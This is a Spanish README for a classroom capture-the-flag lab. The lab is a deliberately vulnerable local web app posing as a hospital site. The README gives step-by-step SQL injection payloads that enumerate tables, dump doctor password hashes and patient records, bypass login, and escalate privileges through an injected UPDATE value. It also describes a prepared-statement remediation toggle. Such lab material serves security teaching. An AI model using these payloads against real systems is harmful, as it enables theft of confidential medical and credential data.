# 🏥 Red Médica Santa María - Hospital Pentesting CTF & SQLi Lab

Este proyecto es una **aplicación web interactiva que simula 100% el sitio web público y portal médico de un Sanatorio y Red de Salud real** (Sanatorio Santa María).

Está diseñado para que **profesores e instructores de ciberseguridad** puedan guiar a sus estudiantes en un ejercicio de **Prueba de Penetración estilo Black-Box (Caja Negra)** dentro del sector de la salud (Healthcare CyberSecurity), para descubrir vulnerabilidades de Inyección SQL (SQLi), explorar el esquema de la base de datos, volcar historiales clínicos de pacientes, credenciales de doctores y escalar privilegios hasta el nivel **Root SysAdmin**.

---

## 🚀 Inicio Rápido

1. En la carpeta del proyecto, ejecute:
   ```bash
   npm start
   ```
2. Abra su navegador e ingrese a:
   ```
   http://localhost:3000
   ```

---

## 🧭 Flujo del Ejercicio Práctico para los Estudiantes (CTF Flow)

 Al ingresar a la web, el estudiante verá una **página hospitalaria pública legítima** con servicios de emergencias 24h, especialidades médicas y artículos de prevención de salud. **No se muestran expedientes de pacientes ni cuentas de médicos a simple vista.**

### Paso 1: Reconocimiento y Descubrimiento del Punto de Inyección
- El estudiante navega a la sección **"Artículos de Salud"**.
- Encuentra la barra de búsqueda de consejos y publicaciones médicas.
- Prueba ingresar una comilla simple `'` o `Cardiología' OR '1'='1`.
- Observa que el servidor responde o genera un error SQL, confirmando la vulnerabilidad de concatenación en el buscador público.

---

### Paso 2: Enumerar la Estructura de la Base de Datos (`sqlite_master`)
* **Objetivo:** Descubrir qué tablas existen en la base de datos SQLite del hospital.
* **Payload a inyectar en el Buscador de Artículos de Salud:**
  ```sql
  ' UNION SELECT 1, type, name, tbl_name, sql, 6 FROM sqlite_master --
  ```
* **Resultado:** El buscador devolverá las tablas médicas ocultas del sistema:
  - `personal_medico_usuarios` (Doctores, matrículas médicas, hashes de contraseña, roles, salarios).
  - `historias_clinicas_pacientes` (Expedientes de pacientes, DNI/SSN, diagnósticos, grupo sanguíneo, prescripciones).
  - `equipamiento_y_farmacia` (Medicamentos controlados y PINs de la bóveda de narcóticos).

---

### Paso 3: Extraer Personal Médico, Hashes y la Cuenta Root SysAdmin
* **Objetivo:** Volcar la información confidencial de la tabla `personal_medico_usuarios`.
* **Payload a inyectar en el Buscador de Salud:**
  ```sql
  ' UNION SELECT 1, matricula_medica, nombre, email, password_hash, rol FROM personal_medico_usuarios --
  ```
* **Resultado:** Aparecerán los doctores y administradores registrados, entre ellos:
  - `sysadmin@santamariahealth.org` (SuperAdmin de IT, Hash: `$2b$10$99Xz88Yy77...`, Rol: `root_sysadmin`)
  - `r.gutierrez@santamariahealth.org` (Director Médico General)
  - `e.morales@santamariahealth.org` (Cardióloga, Admin de Hospital)

---

### Paso 4: Extraer Expedientes de Pacientes e Historias Clínicas
* **Payload a inyectar en el Buscador de Salud:**
  ```sql
  ' UNION SELECT 1, numero_expediente, nombre_paciente, dni_ssn, diagnostico_principal, tratamiento_prescripto FROM historias_clinicas_pacientes --
  ```
* **Resultado:** Muestra la lista de pacientes con sus diagnósticos confidenciales y tratamientos.

---

### Paso 5: Autenticación Bypass en el Portal Médico
* El estudiante abre la ventana **"Acceso Personal Médico"** (botón superior).
* Puede ingresar utilizando las credenciales descubiertas o aplicando **Auth Bypass**:
  - Usuario: `sysadmin@santamariahealth.org' --`
  - Contraseña: *(cualquiera)*

---

### Paso 6: Escalado de Privilegios a Root (UPDATE SQLi)
* Una vez dentro del portal como un médico común, el estudiante ingresa a **"Mi Portal Médico"**.
* Modifica el campo **Especialidad Médica** e inyecta:
  ```text
  Cardiología', rol = 'root_sysadmin
  ```
* Al guardar los cambios, la consulta `UPDATE` sobrescribirá la columna `rol` elevando la cuenta a privilegio de **Superusuario / Root SysAdmin**.

---

## 🛠️ Herramientas Docentes: Security DevTools

En la esquina inferior derecha encontrará el botón **"🛡️ Inspector SQL & DevTools"** para el profesor:
- **Visor de SQL en Vivo:** Muestra exactamente cómo la entrada del estudiante alteró la sintaxis en el backend.
- **Conmutador Vulnerable vs. Seguro:** Cambia con 1 clic el servidor a **Consultas Preparadas (Prepared Statements)** para demostrar la remediación efectiva.
- **Inspector de Tablas Médicas:** Muestra el contenido real de la base de datos del hospital.
- **Reiniciar Base de Datos:** Restablece la base de datos a su estado inicial si un alumno la altera durante la clase.
